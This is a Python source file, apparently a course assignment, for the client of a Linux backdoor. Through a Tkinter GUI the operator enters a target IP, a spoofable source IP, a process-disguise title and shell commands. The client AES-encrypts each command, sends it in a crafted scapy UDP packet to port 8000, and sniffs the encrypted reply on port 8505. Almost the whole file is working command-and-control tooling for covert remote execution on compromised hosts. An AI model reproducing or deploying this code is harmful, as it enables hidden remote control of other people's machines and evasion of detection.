import argparse
import logging
import binascii
from scapy.all import *
from binascii import hexlify, unhexlify
import setproctitle
import sys
from tkinter import *
from tkinter import ttk
import tkinter as tk
import multiprocessing
from multiprocessing import Process
import crypto


def sendData(dstIP,data,title,srcIP):

    startAES = 0
    key = 8
    info = title+ "\"" + data
    
    print("================================")

    print(info)
    
    encrypted_msg = b''
    print("AES encryption")
    
    encrypted_msg = crypto.aesEncrypt(info.encode("utf8"))
    
    print("================================")   
    print("encrypted_msg: "+str(encrypted_msg))
    decryptedText = crypto.aesDecrypt(encrypted_msg)
    print("decryptedText: "+ str(decryptedText))
    print("================================")

    pkt = IP(src=srcIP,dst=dstIP)/UDP(dport=8000,sport=8505)/encrypted_msg
    send(pkt,verbose=0)
    print("sent packet: "+ str(pkt))

def main():
    print("Client start")
    root = Tk()
    root.geometry("600x600+200+200")
    root.title("Linux backdoor 8505 A3")
    root.configure(bg="gray")
    
    global destinationip
    global processtitle
    global command
    global sourceip
    global results

    destinationip = StringVar()
    processtitle = StringVar()
    command = StringVar()
    sourceip = StringVar()
    results = StringVar()   
    results.set("Result here")

    #GUI interface
    lDestIP = Label(root, text = "Destination IP", width = 20,bg="black", fg="white")
    lDestIP.grid(column = 0, row = 3)
    eDestIP = Entry(root, textvariable = destinationip,fg="black", bg='white', width = 30)
    eDestIP.grid(column = 1, row = 3, padx = 12, pady = 10, ipady = 3)

    lSourceIP = Label(root, text = "Source IP", fg="white",bg="black")
    lSourceIP.grid(column = 0, row = 4)
    eSourceIP = Entry(root, textvariable = sourceip,fg="black", bg='white', width = 30)
    eSourceIP.grid(column = 1, row = 4, pady = 8, ipady = 3)

    lProcessTitle = Label(root, text = "Process Title", fg="white",bg="black")
    lProcessTitle.grid(column = 0, row = 6)
    mProcessTitle = Entry(root, textvariable = processtitle,fg="black", bg='white', width = 30)
    mProcessTitle.grid(column = 1, row = 6, pady = 8, ipady = 3)

    lCommand = Label(root, text = "Commands to send", fg="white",bg="black")
    lCommand.grid(column = 0, row = 8, padx = 8)
    eCommand = Entry(root, textvariable = command, fg="black",bg='white', width = 30)
    eCommand.grid(column = 1, row = 8, pady = 8, ipady = 3)
    
    b = tk.Button(root, text="Send Command", command=parse, width = 10, background = "red", activebackground = "blue", activeforeground = "green")
    b.grid(column = 1, row = 14, pady = 2, ipady = 2, columnspan = 1)

    #Show results

    lResults = tk.Label(root, textvariable = results, fg = "black")
    lResults.grid(column = 1, row = 15, pady = 3, ipady = 2, columnspan = 1)
        
    
    root.mainloop()
    
def parse():

    global destIP
    destIP = destinationip.get()
    print (destIP)
    processTitle = processtitle.get()
    newCommand = command.get()
    sourceIP = sourceip.get()

    
    sendData(destIP, newCommand, processTitle, sourceIP)
    if command == ("quit"):
        exit()
    sniff(filter="udp and dst port 8505 and src port 8000", prn=readPacket, count=1)

def readPacket(pkt):

    if ARP not in pkt:
        data = pkt["Raw"].load
        decryptedMessage = crypto.aesDecrypt(data)
        message = binascii.unhexlify(decryptedMessage)
        decoded = message.decode("utf-8")
        print("================================")
        print (decoded)
        print("================================")

    results.set(decoded)
    
    return

if __name__ == '__main__':

    try:
        main()
    except KeyboardInterrupt:
        print ('Exiting..')
    
    
    
